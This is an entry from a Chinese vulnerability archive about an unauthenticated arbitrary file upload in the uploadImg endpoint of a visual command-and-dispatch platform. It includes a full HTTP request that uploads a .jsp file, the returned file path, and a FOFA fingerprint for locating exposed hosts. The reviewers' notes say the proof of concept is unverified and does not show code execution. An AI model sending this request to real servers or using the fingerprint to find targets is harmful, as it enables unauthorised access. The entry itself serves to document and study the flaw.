---
source: "wy876 漏洞文库"
title: "可视化融合指挥调度平台（厂商待核） layuiIm uploadImg上传"
product: "可视化融合指挥调度平台（厂商待核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，JSP可执行目录"
prerequisites: "匿名声称"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bya2i7xgu6phi6t0"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%9E%8D%E5%90%88%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0/%E5%8F%AF%E8%A7%86%E5%8C%96%E8%9E%8D%E5%90%88%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0/%E5%8F%AF%E8%A7%86%E5%8C%96%E8%9E%8D%E5%90%88%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0uploadImg%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"base/searchInfoWindow_min.css\""
fofa_unverified: "body="
id: "vw-f278e7a07aae278d4c78f728"
entity_id: "ve-f278e7a07aae278d4c78f728"
schema_version: "1"
---

# 可视化融合指挥调度平台（厂商待核） layuiIm uploadImg上传

## 条目说明

- 对象与具体问题：可视化融合指挥调度平台（厂商待核）；layuiIm uploadImg上传
- 版本、配置及部署条件：版本未知，JSP可执行目录
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 上传内容只有1，不能证明JSP执行/服务器控制
- 固定历史日期响应路径缺上传返回，Content-Length静态
- Java路由与同目录PHP指挥调度产品指纹不同，不能凭泛产品名混并；无版本/修复

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
可视化融合指挥调度平台以标准SIP协议为核心，提供强大的调度、广播、视频、报警、预案、电子地图等功能模块，可实现多级架构管理，满足不同行业调度需求。可视化融合指挥调度平台 uploadImg 接口处存在任意文件上传漏洞，未经身份验证的攻击者可利用此漏洞上传恶意后门文件，导致服务器权限被控。

## 二、影响版本
+ 可视化融合指挥调度平台

## 三、资产测绘
+ fofa`body="base/searchInfoWindow_min.css"`
+ 特征


## 四、漏洞复现
```http
POST /dispatch/layuiIm/uploadImg HTTP/1.1
Host: 
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
Content-Length: 151

------WebKitFormBoundary7ctER307B0RaQwOp
Content-Disposition: form-data; name="file";filename="1.jsp"

1
------WebKitFormBoundary7ctER307B0RaQwOp--
```

> 请求长度说明：原资料 Content-Length 为 151；保留原始标头；其数值未据实际请求体重新计算或验证。


```plain
/media/png/2024/4/22/1713787261034.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bya2i7xgu6phi6t0>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
